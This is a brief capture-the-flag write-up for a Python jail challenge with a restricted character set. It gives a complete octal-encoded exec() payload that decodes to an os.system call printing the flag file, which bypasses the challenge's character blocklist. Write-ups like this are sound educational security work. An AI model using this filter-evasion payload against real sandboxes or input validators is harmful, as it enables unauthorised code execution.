## Writeup

Similar challange to pyjail1 / Blackbeard's sunken treasure chest. You are dropped in a similar state, but you are blocked from using quite allot of characters. 
By submitting all printable characters to the service we are left with these possible inputs: `exvc(')1234567890`. This in turn makes e.g hex input to python impossible, but it is still possible to use octal. 
For this reason we can print the flag using the following:

`exec('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\143\141\164\40\146\154\141\147\47\51')`

Where the numbers here is translated from `__import__('os').system('cat flag')`. This can be one using a variety of tools, for example Cyberchef. 